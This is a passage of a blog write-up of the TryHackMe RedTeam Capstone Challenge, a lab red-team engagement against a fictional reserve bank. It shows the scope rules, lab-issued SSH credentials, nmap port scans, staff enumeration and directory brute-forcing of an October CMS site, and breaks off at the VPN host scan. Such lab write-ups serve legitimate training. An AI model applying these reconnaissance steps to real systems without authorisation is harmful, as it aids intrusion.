<!DOCTYPE html><html lang="en-US" ><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"><meta name="generator" content="Jekyll v4.4.1" /><meta property="og:title" content="Breaking the Vault A Detailed Walkthrough of The RedTeam Capstone Challenge" /><meta name="author" content="Muhammad Adel" /><meta property="og:locale" content="en_US" /><meta name="description" content="TryHackMe’s RedTeam Capstone Challenge provides an unparalleled, hands-on experience that simulates real-world hacking scenarios. This challenge tests your skills in network infiltration, vulnerability exploitation, and navigating complex defenses." /><meta property="og:description" content="TryHackMe’s RedTeam Capstone Challenge provides an unparalleled, hands-on experience that simulates real-world hacking scenarios. This challenge tests your skills in network infiltration, vulnerability exploitation, and navigating complex defenses." /><link rel="canonical" href="https://itsfading.github.io/posts/TryHackMe-RedTeamCapstoneNetwork-Writeup/" /><meta property="og:url" content="https://itsfading.github.io/posts/TryHackMe-RedTeamCapstoneNetwork-Writeup/" /><meta property="og:site_name" content="Muhammad Adel" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2024-07-26T19:52:00+03:00" /><meta name="twitter:card" content="summary" /><meta property="twitter:title" content="Breaking the Vault A Detailed Walkthrough of The RedTeam Capstone Challenge" /><meta name="twitter:site" content="@ItsFadinG_" /><meta name="twitter:creator" content="@Muhammad Adel" /><meta name="google-site-verification" content="google_meta_tag_verification" /> <script type="application/ld+json"> {"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"Muhammad Adel"},"dateModified":"2025-04-07T14:02:05+02:00","datePublished":"2024-07-26T19:52:00+03:00","description":"TryHackMe’s RedTeam Capstone Challenge provides an unparalleled, hands-on experience that simulates real-world hacking scenarios. This challenge tests your skills in network infiltration, vulnerability exploitation, and navigating complex defenses.","headline":"Breaking the Vault A Detailed Walkthrough of The RedTeam Capstone Challenge","mainEntityOfPage":{"@type":"WebPage","@id":"https://itsfading.github.io/posts/TryHackMe-RedTeamCapstoneNetwork-Writeup/"},"url":"https://itsfading.github.io/posts/TryHackMe-RedTeamCapstoneNetwork-Writeup/"}</script><title>Breaking the Vault | A Detailed Walkthrough of The RedTeam Capstone Challenge | Muhammad Adel</title><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-touch-icon.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/favicons/site.webmanifest"><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico"><meta name="apple-mobile-web-app-title" content="Muhammad Adel"><meta name="application-name" content="Muhammad Adel"><meta name="msapplication-TileColor" content="#da532c"><meta name="msapplication-config" content="/assets/img/favicons/browserconfig.xml"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://fonts.gstatic.com"><link rel="preconnect" href="https://www.google-analytics.com" crossorigin="use-credentials"><link rel="dns-prefetch" href="https://www.google-analytics.com"><link rel="preconnect" href="https://www.googletagmanager.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://www.googletagmanager.com"><link rel="preconnect" href="https://cdn.jsdelivr.net"><link rel="dns-prefetch" href="https://cdn.jsdelivr.net"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/css/bootstrap.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css"><link rel="stylesheet" href="/assets/css/style.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/magnific-popup@1.1.0/dist/magnific-popup.min.css"> <script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script> <script defer src="https://cdn.jsdelivr.net/combine/npm/popper.js@1.15.0,npm/bootstrap@4/dist/js/bootstrap.min.js"></script> <script async src="https://cdn.jsdelivr.net/combine/npm/lozad/dist/lozad.min.js,npm/magnific-popup@1/dist/jquery.magnific-popup.min.js"></script> <script defer src="/assets/js/dist/post.min.js"></script> <script defer src="/app.js"></script> <script defer src="https://www.googletagmanager.com/gtag/js?id="></script> <script> document.addEventListener("DOMContentLoaded", function(event) { window.dataLayer = window.dataLayer || []; function gtag(){dataLayer.push(arguments);} gtag('js', new Date()); gtag('config', ''); }); </script><body data-spy="scroll" data-target="#toc"><div id="sidebar" class="d-flex flex-column align-items-end"><div class="profile-wrapper text-center"><div id="avatar"> <a href="/" alt="avatar" class="mx-auto"> <img src="/assets/img/Mine.jpeg" alt="avatar" onerror="this.style.display='none'"> </a></div><div class="site-title mt-3"> <a href="/">Muhammad Adel</a></div><div class="site-subtitle font-italic">CyberSecurity geek, who wants to share his day-to-day knowledge</div></div><ul class="w-100"><li class="nav-item"> <a href="/" class="nav-link"> <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i> <span>HOME</span> </a><li class="nav-item"> <a href="/categories/" class="nav-link"> <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i> <span>CATEGORIES</span> </a><li class="nav-item"> <a href="/tags/" class="nav-link"> <i class="fa-fw fas fa-tags ml-xl-3 mr-xl-3 unloaded"></i> <span>TAGS</span> </a><li class="nav-item"> <a href="/archives/" class="nav-link"> <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i> <span>ARCHIVES</span> </a><li class="nav-item"> <a href="/about/" class="nav-link"> <i class="fa-fw fas fa-info ml-xl-3 mr-xl-3 unloaded"></i> <span>ABOUT</span> </a></ul><div class="sidebar-bottom mt-auto d-flex flex-wrap justify-content-center"> <a href="https://twitter.com/ItsFadinG_" aria-label="twitter" class="order-3" target="_blank" rel="noopener"> <i class="fab fa-twitter"></i> </a> <a href="https://www.linkedin.com/in/muhammadadel14" aria-label="linkedin" class="order-4" target="_blank" rel="noopener"> <i class="fab fa-linkedin"></i> </a> <a href="https://github.com/ItsFadinG" aria-label="github" class="order-5" target="_blank" rel="noopener"> <i class="fab fa-github-alt"></i> </a> <a href=" javascript:location.href = 'mailto:' + ['Muhammad.adel.tr','gmail.com'].join('@')" aria-label="email" class="order-6" > <i class="fas fa-envelope"></i> </a> <span class="icon-border order-2"></span> <span id="mode-toggle-wrapper" class="order-1"> <i class="mode-toggle fas fa-adjust"></i> <script type="text/javascript"> class ModeToggle { static get MODE_KEY() { return "mode"; } static get DARK_MODE() { return "dark"; } static get LIGHT_MODE() { return "light"; } constructor() { if (this.hasMode) { if (this.isDarkMode) { if (!this.isSysDarkPrefer) { this.setDark(); } } else { if (this.isSysDarkPrefer) { this.setLight(); } } } var self = this; /* always follow the system prefers */ this.sysDarkPrefers.addListener(function() { if (self.hasMode) { if (self.isDarkMode) { if (!self.isSysDarkPrefer) { self.setDark(); } } else { if (self.isSysDarkPrefer) { self.setLight(); } } self.clearMode(); } self.updateMermaid(); }); } /* constructor() */ setDark() { $('html').attr(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE); } setLight() { $('html').attr(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE); } clearMode() { $('html').removeAttr(ModeToggle.MODE_KEY); sessionStorage.removeItem(ModeToggle.MODE_KEY); } get sysDarkPrefers() { return window.matchMedia("(prefers-color-scheme: dark)"); } get isSysDarkPrefer() { return this.sysDarkPrefers.matches; } get isDarkMode() { return this.mode == ModeToggle.DARK_MODE; } get isLightMode() { return this.mode == ModeToggle.LIGHT_MODE; } get hasMode() { return this.mode != null; } get mode() { return sessionStorage.getItem(ModeToggle.MODE_KEY); } /* get the current mode on screen */ get modeStatus() { if (this.isDarkMode || (!this.hasMode && this.isSysDarkPrefer) ) { return ModeToggle.DARK_MODE; } else { return ModeToggle.LIGHT_MODE; } } updateMermaid() { if (typeof mermaid !== "undefined") { let expectedTheme = (this.modeStatus === ModeToggle.DARK_MODE? "dark" : "default"); let config = { theme: expectedTheme }; /* re-render the SVG › <https://github.com/mermaid-js/mermaid/issues/311#issuecomment-332557344> */ $(".mermaid").each(function() { let svgCode = $(this).prev().children().html(); $(this).removeAttr("data-processed"); $(this).html(svgCode); }); mermaid.initialize(config); mermaid.init(undefined, ".mermaid"); } } flipMode() { if (this.hasMode) { if (this.isSysDarkPrefer) { if (this.isLightMode) { this.clearMode(); } else { this.setLight(); } } else { if (this.isDarkMode) { this.clearMode(); } else { this.setDark(); } } } else { if (this.isSysDarkPrefer) { this.setLight(); } else { this.setDark(); } } this.updateMermaid(); } /* flipMode() */ } /* ModeToggle */ let toggle = new ModeToggle(); $(".mode-toggle").click(function() { toggle.flipMode(); }); </script> </span></div></div><div id="topbar-wrapper" class="row justify-content-center topbar-down"><div id="topbar" class="col-11 d-flex h-100 align-items-center justify-content-between"> <span id="breadcrumb"> <span> <a href="/"> Posts </a> </span> <span>Breaking the Vault | A Detailed Walkthrough of The RedTeam Capstone Challenge</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Post</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" autocomplete="off" placeholder="Search..."> <i class="fa fa-times-circle fa-fw" id="search-cleaner"></i> </span> <span id="search-cancel" >Cancel</span></div></div><div id="main-wrapper"><div id="main"><div class="row"><div id="post-wrapper" class="col-12 col-lg-11 col-xl-8"><div class="post pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><h1 data-toc-skip>Breaking the Vault | A Detailed Walkthrough of The RedTeam Capstone Challenge</h1><div class="post-meta text-muted d-flex flex-column"><div> <span class="semi-bold"> Muhammad Adel </span> <span class="timeago " data-toggle="tooltip" data-placement="bottom" title="Fri, Jul 26, 2024, 7:52 PM +0300" prep="on" > Jul 26, 2024 <i class="unloaded">2024-07-26T19:52:00+03:00</i> </span></div><div> <span> <span class="timeago lastmod" data-toggle="tooltip" data-placement="bottom" title="Mon, Apr 7, 2025, 2:02 PM +0200" prefix="Updated " > Apr 7 <i class="unloaded">2025-04-07T14:02:05+02:00</i> </span> </span> <span class="readtime" data-toggle="tooltip" data-placement="bottom" title="12167 words">67 min</span></div></div><div class="post-content"><p>TryHackMe’s RedTeam Capstone Challenge provides an unparalleled, hands-on experience that simulates real-world hacking scenarios. This challenge tests your skills in network infiltration, vulnerability exploitation, and navigating complex defenses. <img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/N-RedTeamCC/badge.png" alt="Untitled" /></p><p>Peace be upon all of you, In this writeup, I won’t just be sharing the direct solutions. Instead, I’ll take you on a journey through my own experiences, including the failed attempts and the lessons learned. Together, we’ll navigate the twists and turns of this capstone challenge, making it feel as if you’re solving it yourself. let’s hack the bank.</p><h2 id="introduction"><strong>Introduction</strong></h2><h3 id="project-overview"><strong>Project Overview</strong></h3><p>TryHackMe, a cybersecurity consultancy firm, has been approached by the government of Trimento to perform a red team engagement against their Reserve Bank (TheReserve).</p><p>Trimento is an island country situated in the Pacific. While they may be small in size, they are by no means not wealthy due to foreign investment. Their reserve bank has two main divisions:</p><ul><li><strong>Corporate</strong> - The reserve bank of Trimento allows foreign investments, so they have a department that takes care of the country’s corporate banking clients.<li><strong>Bank</strong> - The reserve bank of Trimento is in charge of the core banking system in the country, which connects to other banks around the world.</ul><p>The Trimento government has stated that the assessment will cover the entire reserve bank, including both its perimeter and internal networks. They are concerned that the corporate division while boosting the economy, may be endangering the core banking system due to insufficient segregation. The outcome of this red team engagement will determine whether the corporate division should be spun off into its own company.</p><h3 id="project-goal"><strong>Project Goal</strong></h3><p>The purpose of this assessment is to evaluate whether the corporate division can be compromised and, if so, determine if it could compromise the bank division. A simulated fraudulent money transfer must be performed to fully demonstrate the compromise.</p><p>To do this safely, TheReserve will create two new core banking accounts for you. You will need to demonstrate that it’s possible to transfer funds between these two accounts. The only way this is possible is by gaining access to SWIFT, the core backend banking system.</p><p><em><strong>Note:</strong> SWIFT</em> (Society for Worldwide Interbank Financial Telecommunications) <em>is the actual system that is used by banks for backend transfers. In this assessment, a core backend system has been created. However, for security reasons, intentional inaccuracies have been introduced into this process. If you wish to learn more about actual SWIFT and its security, feel free to go do some research! To put it in other words, the information that follows here has been <strong>made up</strong>.</em></p><p>To help you understand the project goal, the government of Trimento has shared some information about the SWIFT backend system. SWIFT runs in an isolated secure environment with restricted access. While the word impossible should not be used lightly, the likelihood of the compromise of the actual hosting infrastructure is so slim that it is fair to say that it is impossible to compromise this infrastructure.</p><p>However, the SWIFT backend exposes an internal web application at <a href="http://swift.bank.thereserve.loc/,">http://swift.bank.thereserve.loc/,</a> which TheReserve uses to facilitate transfers. The government has provided a general process for transfers. To transfer funds:</p><ol><li>A customer makes a request that funds should be transferred and receives a transfer code.<li>The customer contacts the bank and provides this transfer code.<li>An employee with the capturer role authenticates to the SWIFT application and <em>captures</em> the transfer.<li>An employee with the approver role reviews the transfer details and, if verified, <em>approves</em> the transfer. This has to be performed from a jump host.<li>Once approval for the transfer is received by the SWIFT network, the transfer is facilitated and the customer is notified.</ol><p>Separation of duties is performed to ensure that no single employee can both capture and approve the same transfer.</p><h3 id="project-scope"><strong>Project Scope</strong></h3><p>This section details the project scope. <strong>In-Scope</strong></p><ul><li>Security testing of TheReserve’s internal and external networks, including all IP ranges accessible through your VPN connection.<li>OSINTing of TheReserve’s corporate website, which is exposed on the external network of TheReserve. Note, this means that all OSINT activities should be limited to the provided network subnet and no external internet OSINTing is required.<li>Phishing of any of the employees of TheReserve.<li>Attacking the mailboxes of TheReserve employees on the WebMail host (.11).<li>Using any attack methods to complete the goal of performing the transaction between the provided accounts. <strong>Out-of-Scope</strong><li>Security testing of any sites not hosted on the network.<li>Any security testing on the WebMail server (.11) that alters the mail server configuration or its underlying infrastructure.<li>Attacking the mailboxes of other red teamers on the WebMail portal (.11).<li>External (internet) OSINT gathering.<li>Attacking any hosts outside of the provided subnet range. Once you have completed the questions below, your subnet will be displayed in the network diagram. This 10.200.X.0/24 network is the only in-scope network for this challenge.</ul><h3 id="project-tools"><strong>Project Tools</strong></h3><p>In order to perform the project, the government of Trimento has decided to disclose some information and provide some tools that might be useful for the exercise. You do not have to use these tools and are free to use whatever you prefer. If you wish to use this information and tools, you can either find them on the AttackBox under <strong><code class="language-plaintext highlighter-rouge">/root/Rooms/CapstoneChallenge</code></strong> or download them as a task file using the blue button at the top of this task above the video. If you download them as a task file, use the password of <strong><code class="language-plaintext highlighter-rouge">Capstone</code></strong> to extract the zip. Note that these tools will be flagged as malware on Windows machines.</p><p><strong>Note</strong>: For the provided password policy that requires a special character, the characters can be restricted to the following: <strong><code class="language-plaintext highlighter-rouge">!@#$%^</code></strong></p><h3 id="project-registration"><strong>Project Registration</strong></h3><p>The Trimento government mandates that all red teamers from TryHackMe participating in the challenge must register to allow their <strong>single point of contact</strong> for the engagement to track activities. As the island’s network is segregated, this will also provide the testers access to an email account for communication with the government and an <strong>approved phishing email address</strong>, should phishing be performed.</p><p>To register, you need to get in touch with the government through its e-Citizen communication portal that uses SSH for communication. Here are the SSH details provided:</p><div class="table-wrapper"><table><thead><tr><th>SSH Username<th>e-citizen<tbody><tr><td>SSH Password<td>stabilitythroughcurrency<tr><td>SSH IP<td>X.X.X.250</table></div><p>Once you complete the questions below, the network diagram at the start of the room will show the IP specific to your network. Use that information to replace the X values in your SSH IP.</p><p>Once you authenticate, you will be able to communicate with the e-Citizen system. Follow the prompts to register for the challenge, and save the information you get for future reference. Once registered, follow the instructions to verify that you have access to all the relevant systems.</p><p>The VPN server and the e-Citizen platform are not in scope for this assessment, and any security testing of these systems may lead to a ban from the challenge.</p><p>As you make your way through the network, you will need to prove your compromises. In order to do that, you will be requested to perform specific steps on the host that you have compromised. Please note the hostnames in the network diagram above, as you will need this information. <strong>Flags can only be accessed from matching hosts, so even if you have higher access, you will need to lower your access to the specific host required to submit the flag.</strong></p><p><strong>Note: If the network has been reset or if you have joined a new subnet after your time in the network expired, your e-Citizen account will remain active. However, you will need to request that the system recreates your mailbox for you. This can be done by authenticating to e-Citizen and then selecting option 3.</strong></p><h3 id="summary"><strong>Summary</strong></h3><p>Please make sure you understand the points below before starting. If any point is unclear, please reread this task.</p><ul><li>The purpose of this assessment is to evaluate whether the corporate division can be compromised and, if so, determine if it could result in the compromise of the bank division.<li>To demonstrate the compromise, a simulated fraudulent money transfer must be performed by gaining access to the SWIFT core backend banking system.<li>The SWIFT backend infrastructure is secure but exposes an internal web application used by TheReserve to facilitate transfers.<li>A general process for transfers involves the separation of duties to ensure that one employee cannot both capture and approve the same transfer.<li>You have been provided with some information and tools that you may find helpful in the exercise, including a password policy, but you are free to use your own.<li>There are rules in place that determine what you are allowed and disallowed to do. Failure to adhere to these rules might result in a ban from the challenge.<li>After gaining access to the network, you need to register for the challenge through e-Citizen communication portal using provided SSH details.<li>You will need to prove compromises by performing specific steps on the host that you have compromised. These steps will be provided to you through the e-Citizen portal. <img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/N-RedTeamCC/08d12c36-9c71-4668-8f59-1d9adf1d5725.png" alt="Untitled" /></ul><h2 id="preparations"><strong>Preparations</strong></h2><h3 id="capstone-challenge-resources"><strong>Capstone Challenge Resources</strong></h3><p>Let’s start our journey by Downloading the Capstone Challenge resources, we receive two files detailing the current password policies and a base list of passwords. Additionally, we get a list of common tools to use throughout the challenge.</p><h3 id="updating-the-hosts-file"><strong>Updating the hosts file</strong></h3><p>We start by adding the IP addresses in our hosts file, so that we can resolve hostname even if we change subnets.</p><pre><code class="language-txt">10.200.x.11 MAIL.thereserve.loc
10.200.x.12 VPN.thereserve.loc
10.200.x.13 WEB.thereserve.loc
</code></pre><h3 id="ssh-registration"><strong>SSH Registration</strong></h3><p>We accessed the e-citizen communication portal via SSH using the provided credentials and registered our account. This portal will be crucial for proving the compromises, as it requires us to perform specific steps on the compromised hosts.</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
</pre><td class="rouge-code"><pre><span class="nv">$ </span>ssh e-citizen@10.200.x.250
e-citizen@10.200.x.250<span class="s1">'s password: 

Welcome to the e-Citizen platform!
Please make a selection:
[1] Register
[2] Authenticate
[3] Exit
Selection:1
Please provide your THM username: ItsFadinG
Creating email user
User has been successfully created
=======================================
Thank you for registering on e-Citizen for the Red Team engagement against TheReserve.
Please take note of the following details and please make sure to save them, as they will not be displayed again.
=======================================
Username: ItsFadinG
Password: 8y-oRyYwJhO8Q7xe
MailAddr: ItsFadinG@corp.th3reserve.loc
IP Range: 10.200.x.0/24
=======================================
These details are now active. As you can see, we have already purchased a domain for domain squatting to be used for phishing.
Once you discover the webmail server, you can use these details to authenticate and recover additional project information from your mailbox.
Once you have performed actions to compromise the network, please authenticate to e-Citizen in order to provide an update to the government. If your update is sufficient, you will be awarded a flag to indicate progress.
=======================================
Please note once again that the e-Citizen platform, and this VPN server, 10.200.x.250, are not in-scope for this assessment.
Any attempts made against this machine will result in a ban from the challenge.
=======================================
Best of luck and may you hack the bank!
</span></pre></table></code></div></div><h2 id="exploring-the-network"><strong>Exploring The Network</strong></h2><h3 id="web-machine"><strong>WEB Machine</strong></h3><h4 id="nmap"><strong>Nmap</strong></h4><p>We will start by doing Nmap to know the available ports on the WEB machine.</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
</pre><td class="rouge-code"><pre>nmap <span class="nt">-p-</span> 10.200.x.13           
Starting Nmap 7.93 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2024-05-19 13:43 EET
Not shown: 65533 closed tcp ports <span class="o">(</span>reset<span class="o">)</span>
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
</pre></table></code></div></div><h4 id="the-web-page"><strong>The Web Page</strong></h4><p>This IP is hosting a web page that gives us an overview about the company and its team.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/N-RedTeamCC/webpage1.png" alt="Untitled" /></p><p>As this simulates real red team engagements, knowing company workers is a critical part of any redteam engagements. <img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/N-RedTeamCC/webpage2.png" alt="Untitled" /></p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
</pre><td class="rouge-code"><pre>Aimee Walker <span class="nt">--</span> Lead Developers
Patrick Edwards <span class="nt">--</span> Lead Developers
Brenda Henderson <span class="nt">--</span> Bank Director
Leslie Morley <span class="nt">--</span> Deputy Directors
Martin Savage <span class="nt">--</span> Deputy Directors
paula bailey <span class="nt">--</span> CEO 
christopher smith <span class="nt">--</span> CIO 
antony ross <span class="nt">--</span> CTO 
charlene thomas <span class="nt">--</span> CMO 
rhys parsons <span class="nt">--</span> COO 
lynda gordon <span class="nt">--</span> Personal Assistance to the Executives
Roy sims <span class="nt">--</span> Project Manager
laura wood
emily harvey
ashley chan
keith allen
mohammad ahmed
</pre></table></code></div></div><p>Also, looking at the image name gave us hints about the email creation rules that are being used by the organization: <code class="language-plaintext highlighter-rouge">firstname.lastname@domain.com</code> <img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/N-RedTeamCC/Untitled.png" alt="Untitled" /></p><h4 id="directory-brute-forcing"><strong>Directory Brute forcing</strong></h4><p>Let’s discover some directories:</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
</pre><td class="rouge-code"><pre>┌──<span class="o">(</span>root㉿kali<span class="o">)</span>-[/opt/dirsearch]
└─<span class="nv">$ </span>python3 dirsearch.py <span class="nt">-u</span> 10.200.x.13 <span class="nt">-e</span> php <span class="nt">--random-agent</span>

  _|. _ _  _  _  _ _|_    v0.4.3
 <span class="o">(</span>_||| _<span class="o">)</span> <span class="o">(</span>/_<span class="o">(</span>_|| <span class="o">(</span>_| <span class="o">)</span>

Extensions: php | HTTP method: GET | Threads: 25 | Wordlist size: 9513

Output: /opt/dirsearch/reports/_10.200.x.13/_24-05-19_14-22-08.txt

Target: http://10.200.x.13/

<span class="o">[</span>14:22:08] Starting:                                            
<span class="o">[</span>14:23:39] 200 -   24KB - /info.php                                        
</pre></table></code></div></div><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/N-RedTeamCC/Untitled%201.png" alt="Untitled" /></p><p>Great! There is an exposed PHP info file that is leaking so much info about this web server. Using a plugin for the browser called Wappalyzer, we can check on the technologies used by the server, including their versions. October CMS is being used, so let’s brute force its directory.</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
</pre><td class="rouge-code"><pre>┌──<span class="o">(</span>root㉿kali<span class="o">)</span>-[/opt/dirsearch]
└─<span class="nv">$ </span>python3 dirsearch.py <span class="nt">-u</span> 10.200.x.13/october <span class="nt">-e</span> php <span class="nt">--random-agent</span>

  _|. _ _  _  _  _ _|_    v0.4.3                                                                                                                                                                                                            
 <span class="o">(</span>_||| _<span class="o">)</span> <span class="o">(</span>/_<span class="o">(</span>_|| <span class="o">(</span>_| <span class="o">)</span>                                                                                                                                                                                                                   
Extensions: php | HTTP method: GET | Threads: 25 | Wordlist size: 9513

Output: /opt/dirsearch/reports/_10.200.x.13/_october_24-05-19_14-31-34.txt

Target: http://10.200.x.13/

<span class="o">[</span>14:31:35] Starting: october/                                                                                                                                                                                                               
<span class="o">[</span>14:31:44] 200 -   15B  - /october/.gitignore                                                                 
<span class="o">[</span>14:32:42] 301 -  323B  - /october/config  -&gt;  http://10.200.x.13/october/config/
<span class="o">[</span>14:32:43] 200 -  683B  - /october/config/                                  
<span class="o">[</span>14:32:43] 500 -    0B  - /october/config/app.php
<span class="o">[</span>14:33:10] 200 -    1KB - /october/index.php                                                 
<span class="o">[</span>14:33:26] 301 -  324B  - /october/modules  -&gt;  http://10.200.x.13/october/modules/
<span class="o">[</span>14:33:26] 200 -  478B  - /october/modules/                                 
<span class="o">[</span>14:33:42] 200 -  453B  - /october/plugins/                                 
<span class="o">[</span>14:33:42] 301 -  324B  - /october/plugins  -&gt;  http://10.200.x.13/october/plugins/
<span class="o">[</span>14:33:47] 200 -    2KB - /october/README.md                                
<span class="o">[</span>14:33:52] 200 -    1KB - /october/server.php                               
<span class="o">[</span>14:34:00] 301 -  324B  - /october/storage  -&gt;  http://10.200.x.13/october/storage/
<span class="o">[</span>14:34:00] 200 -  549B  - /october/storage/                                 
<span class="o">[</span>14:34:05] 200 -  454B  - /october/themes/                                  
<span class="o">[</span>14:34:05] 301 -  323B  - /october/themes  -&gt;  http://10.200.x.13/october/themes/
<span class="o">[</span>14:34:11] 200 -  780B  - /october/vendor/                                  
<span class="o">[</span>14:34:11] 200 -    0B  - /october/vendor/composer/autoload_classmap.php    
<span class="o">[</span>14:34:11] 200 -    0B  - /october/vendor/composer/autoload_files.php
<span class="o">[</span>14:34:12] 200 -    0B  - /october/vendor/composer/autoload_real.php
<span class="o">[</span>14:34:12] 200 -    0B  - /october/vendor/composer/autoload_static.php
<span class="o">[</span>14:34:12] 200 -    0B  - /october/vendor/composer/ClassLoader.php          
<span class="o">[</span>14:34:11] 200 -    0B  - /october/vendor/autoload.php
<span class="o">[</span>14:34:12] 200 -    0B  - /october/vendor/composer/autoload_namespaces.php  
<span class="o">[</span>14:34:12] 200 -    1KB - /october/vendor/composer/LICENSE                  
<span class="o">[</span>14:34:12] 200 -    0B  - /october/vendor/composer/autoload_psr4.php        
<span class="o">[</span>14:34:13] 200 -  132KB - /october/vendor/composer/installed.json     
</pre></table></code></div></div><p>Going through the discovered paths indicating that there are so many directory listing in this web server but one of them caught my eyes! <code class="language-plaintext highlighter-rouge">http://10.200.x.13/october/modules/</code> <img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/N-RedTeamCC/Untitled%202.png" alt="Untitled" /></p><p>Going through the backend files, it tells us that there is an administration panel, but what is its path? With the help of brute forcing and guessing, I was able to discover the correct path for the administration panel.</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
</pre><td class="rouge-code"><pre>python3 dirsearch.py <span class="nt">-u</span> 10.200.x.13/october/index.php/ <span class="nt">-e</span> php <span class="nt">--random-agent</span>                   

  _|. _ _  _  _  _ _|_    v0.4.3                                                                                    
 <span class="o">(</span>_||| _<span class="o">)</span> <span class="o">(</span>/_<span class="o">(</span>_|| <span class="o">(</span>_| <span class="o">)</span>                                                                                             
     
Extensions: php | HTTP method: GET | Threads: 25 | Wordlist size: 9513

Output: /opt/dirsearch/reports/_10.200.x.13/_october_index.php__24-05-19_15-06-24.txt

Target: http://10.200.x.13/

<span class="o">[</span>15:06:25] Starting: october/index.php/                                                                             
<span class="o">[</span>15:06:29] 404 -  275B  - /october/index.php/%2e%2e//google.com             
<span class="o">[</span>15:07:33] 302 -  482B  - /october/index.php/backend/  -&gt;  http://10.200.x.13/october/index.php/backend/backend/auth
<span class="o">[</span>15:07:59] 200 -  965B  - /october/index.php/error                          
<span class="o">[</span>15:08:00] 200 -  965B  - /october/index.php/error/     
</pre></table></code></div></div><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/N-RedTeamCC/Untitled%203.png" alt="Untitled" /> <img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/N-RedTeamCC/Untitled%204.png" alt="Untitled" /></p><p>Hmm! But what could be the username and the password for this? Let’s resume our enumeration for other exposed IPs, such as the VPN and Mail Server.</p><h3 id="vpn-machine"><strong>VPN Machine</strong></h3><h4 id="nmap-1"><strong>Nmap</strong></h4><p>Running Nmap tool to check for open ports:</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
</pre><td class="rouge-code"><pre><span class="c"># Nmap 7.93 scan initiated Sat May 13 14:29:54 2023 as: nmap -p- --min-rate 5000 -oN</span>
scans/nmap_alltcp.md 10.200.103.12
Nmap scan report <span class="k">for </span>10.200.103.12
